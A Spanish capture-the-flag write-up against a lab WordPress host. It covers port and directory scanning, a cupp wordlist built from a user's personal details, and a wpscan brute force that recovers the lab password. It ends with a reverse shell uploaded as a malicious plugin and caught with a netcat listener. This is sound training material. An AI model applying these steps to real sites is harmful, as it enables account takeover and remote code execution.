### Reconocimiento inicial

Se realizó un escaneo de la dirección IP **172.17.0.2** utilizando **Nmap** para identificar servicios y puertos abiertos. 
##### Escaneo de Puertos abiertos: 

``` python
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oN reconocimientoIncial
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 20:45 -03
Initiating ARP Ping Scan at 20:45
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 20:45, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:45
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 20:45, 0.78s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000060s latency).
Scanned at 2025-05-03 20:45:49 -03 for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```
##### Versiones de servicios:

``` python
┌──(kali㉿kali)-[~]
└─$ nmap -p80,22 -sCV 172.17.0.2 -oN reconocimientoPuertos
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 20:47 -03
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:24:24:f5:66:68:a4:ad:8e:24:0d:70:4a:a5:e3:4f (ECDSA)
|_  256 29:42:2e:b6:85:ae:fb:09:89:8d:b9:c1:dc:4d:fc:1e (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: P\xC3\xA1gina Escolar Universitaria
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
```


``` python
┌──(kali㉿kali)-[~]
└─$ whatweb 172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Página Escolar Universitaria]
```



``` python
┌──(kali㉿kali)-[~]
└─$ nmap --script http-enum -p80 172.17.0.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 20:51 -03
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.34 seconds

```


``` python
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://172.17.0.2         
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                      
 (_||| _) (/_(_|| (_| )                                                                                                                                                               
                                                                                                                                                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_172.17.0.2/_25-05-03_20-53-59.txt

Target: http://172.17.0.2/

[20:53:59] Starting:                                                                                                                                                                  
[20:54:00] 403 -  275B  - /.ht_wsr.txt                                      
[20:54:00] 403 -  275B  - /.htaccess.bak1                                   
[20:54:00] 403 -  275B  - /.htaccess.orig                                   
[20:54:00] 403 -  275B  - /.htaccess.save                                   
[20:54:00] 403 -  275B  - /.htaccess.sample                                 
[20:54:00] 403 -  275B  - /.htaccess_sc
[20:54:00] 403 -  275B  - /.htaccess_extra
[20:54:00] 403 -  275B  - /.htaccessBAK
[20:54:00] 403 -  275B  - /.htaccess_orig
[20:54:00] 403 -  275B  - /.htaccessOLD                                     
[20:54:00] 403 -  275B  - /.htaccessOLD2
[20:54:00] 403 -  275B  - /.html                                            
[20:54:00] 403 -  275B  - /.htm
[20:54:00] 403 -  275B  - /.htpasswds                                       
[20:54:00] 403 -  275B  - /.htpasswd_test
[20:54:00] 403 -  275B  - /.httr-oauth                                      
[20:54:01] 403 -  275B  - /.php                                             
[20:54:07] 301 -  309B  - /assets  ->  http://172.17.0.2/assets/            
[20:54:07] 200 -  529B  - /assets/                                          
[20:54:14] 200 -   24KB - /info.php                                         
[20:54:14] 301 -  313B  - /javascript  ->  http://172.17.0.2/javascript/    
[20:54:19] 301 -  313B  - /phpmyadmin  ->  http://172.17.0.2/phpmyadmin/    
[20:54:19] 200 -    4KB - /phpmyadmin/                                      
[20:54:19] 200 -    4KB - /phpmyadmin/index.php                             
[20:54:22] 403 -  275B  - /server-status/                                   
[20:54:22] 403 -  275B  - /server-status                                    
[20:54:28] 200 -    2KB - /wordpress/wp-login.php                           
[20:54:28] 200 -   14KB - /wordpress/                                       
                                                                             
Task Completed   
```



![[Pasted image 20250503225024.png]]
![[Pasted image 20250503225209.png]]

TLuisillo_o
luisillo

![[Pasted image 20250503224927.png]]


![[Pasted image 20250503224715.png]]

![[Pasted image 20250503224845.png]]

![[Pasted image 20250503231015.png]]
Agregamos el dominio escolares.dl al /etc/hosts
![[Pasted image 20250503231238.png]]


![[Pasted image 20250503231419.png]]
![[Pasted image 20250503231444.png]]





Generador de diccionarios según datos brindados
``` python
┌──(kali㉿kali)-[~]
└─$ cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: luis
> Surname: 
> Nickname: luisillo
> Birthdate (DDMMYYYY): 09101981


> Partners) name: 19131337
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: escolares.dl


> Do you want to add some key words about the victim? Y/[N]: n
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: n

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to luis.txt, counting 5428 words.
[+] Now load your pistolero with luis.txt and shoot! Good luck!

```





``` python
┌──(kali㉿kali)-[~]
└─$ sudo wpscan --url http://172.17.0.2/wordpress --usernames luisillo --passwords luis.txt 
[sudo] contraseña para kali: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Sat May  3 23:27:27 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.17.0.2/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://172.17.0.2/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.5.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://172.17.0.2/wordpress/, Match: 'WordPress 6.5.4'

[+] WordPress theme in use: twentytwentyfour
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=======================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - luisillo / Luis1981                                                                                                                                                       
Trying luisillo / Luis17 Time: 00:00:12 <==================                                                                                      > (1220 / 6648) 18.35%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: luisillo, Password: Luis1981

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat May  3 23:27:44 2025
[+] Requests Done: 1405
[+] Cached Requests: 5
[+] Data Sent: 709.807 KB
[+] Data Received: 23.031 MB
[+] Memory used: 300.91 MB
[+] Elapsed time: 00:00:16



```

luisillo / Luis1981  


Crea un archivo `reverseshell.php` con este contenido (ejemplo en PHP)

 Comprimirlo como ZIP

Colocalo en una carpeta llamada `reverseshell`, y comprimí la carpeta entera en `reverseshell.zip`.

 Subir y activar desde WordPress
- Desde el panel: _Plugins > Añadir nuevo > Subir plugin_    
- Subí `reverseshell.zip` y activalo.    

 Escuchá con netcat

En tu máquina atacante:
nc -lvnp 4444
Cuando WordPress cargue el plugin, ejecutará la reverse shell.

![[Pasted image 20250504000156.png]]
mkdir reverseshell
mv reverseshell.php reverseshell/
zip -r reverseshell.zip reverseshell/


``` python
┌──(kali㉿kali)-[~]
└─$ mkdir reverseshell

┌──(kali㉿kali)-[~]
└─$ mv reverseshell.php reverseshell/

┌──(kali㉿kali)-[~]
└─$ zip -r reverseshell.zip reverseshell/
  adding: reverseshell/ (stored 0%)
  adding: reverseshell/reverseshell.php (deflated 4%)
  
┌──(kali㉿kali)-[~]
└─$ ls
404.php    DockerLabs  Escritorio  luis.txt  Plantillas  puertosInicial        reconocimientoPuertos  reverseshell      typescript  vsftpd_2.3.4_Exploit
Descargas  Documentos  Imágenes    Música    Público     reconocimientoIncial  reports                reverseshell.zip  Vídeos

```


![[Pasted image 20250504000911.png]]


``` python
nc -lvnp 7777
```

![[Pasted image 20250504000955.png]]

![[Pasted image 20250504003151.png]]

![[Pasted image 20250504003327.png]]

![[Pasted image 20250504003931.png]]




